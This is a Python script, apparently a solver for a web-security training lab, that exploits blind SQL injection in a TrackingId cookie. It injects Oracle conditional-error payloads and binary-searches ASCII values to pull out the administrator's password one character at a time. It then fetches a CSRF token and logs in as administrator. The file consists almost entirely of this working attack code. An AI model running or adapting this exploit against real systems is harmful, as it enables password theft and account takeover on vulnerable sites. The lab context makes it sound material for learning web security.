from base.base import Base
from bs4 import BeautifulSoup
from requests import Response
from sql_injection.util import SQLComments

class SQL(Base):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.tracking_id = None

    def _add_args(self):
        pass

    def _cookie_injector(self, content: str):
        self.session.cookies.pop("TrackingId")
        self.session.cookies.set("TrackingId", f"{self.tracking_id}{content}")
    
    def _verify_true_query(self, response: Response):
        if response.status_code == 200:
            return True
        else:
            return False
    
    def _prepare_payload(self, ascii_value_to_compare_with, start_position):
        base_payload = f"' OR (SELECT CASE WHEN (ASCII(SUBSTR((SELECT password from users where username='administrator'), {start_position}, 1)) >= {ascii_value_to_compare_with}) THEN 1 ELSE 1/0 END from DUAL)=1 {SQLComments.ORACLE}"
        return base_payload
    
    def _identify_character_at_position(self, start_position):
        ascii_numbers = list(range(1, 255))

        while ascii_numbers.__len__() > 1:
            middle_index = ascii_numbers.__len__() // 2 # binary search
            middle_ascii_number = ascii_numbers[middle_index]

            payload = self._prepare_payload(middle_ascii_number, start_position)
            self._cookie_injector(f"{payload}")
            response = self.session.get(f"{self.base_url}")
            if self._verify_true_query(response):
                ascii_numbers = ascii_numbers[middle_index:]
            else:
                ascii_numbers = ascii_numbers[:middle_index]

        return ascii_numbers[0]
        

    def _identify_password(self):
        # Generate a list containing all ASCII numbers (0-256)
        password = ""
        last_ascii_value = 999
        position = 1
        
        while True:
            ascii_value = self._identify_character_at_position(position)
            if ascii_value == 1:
                break

            password += chr(ascii_value)
            position += 1
            self.log(f"Password: {password}", "verbose")

        return password
  
    def _get_tracking_id(self):
        while self.tracking_id is None:
            response = self.session.get(f"{self.base_url}")
            if response.status_code == 200:
                self.tracking_id = self.session.cookies.get("TrackingId")
                break
            else:
                self.log("Failed to get tracking ID", "error")
                time.sleep(1)
                
        return self.tracking_id
    
    def _get_csrf_token(self):
        response = self.session.get(f"{self.base_url}/login")
        
        # Extract CSRF token from the hidden input field in the HTML response
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_input = soup.find('input', attrs={'name': 'csrf'})
        
        if csrf_input and csrf_input.get('value'):
            csrf_token = csrf_input.get('value')
            self.log(f"Found CSRF token: {csrf_token}", "verbose")
        else:
            self.log("Could not find CSRF token in the response", "error")
            exit(1)
            
        return csrf_token

    def run(self):
        self._get_tracking_id()
        self.log(f"Tracking ID: {self.tracking_id}", "verbose")

        self.password = self._identify_password()
        self.log(f"Password: {self.password}", "verbose")

        self.log(f"Logging in with credentials: administrator / {self.password}", "verbose")

        self.log("Cleaning cookie", "verbose")
        self._cookie_injector(f"")

        csrf_token = self._get_csrf_token()
        self.log(f"CSRF token: {csrf_token}", "verbose")

        self.log("Logging in", "verbose")

        self.session.post(f"{self.base_url}/login", data={"username": "administrator", "password": self.password, "csrf": csrf_token})
        
        self.is_lab_solved()
    

if __name__ == "__main__":
    sql = SQL()
    sql.run()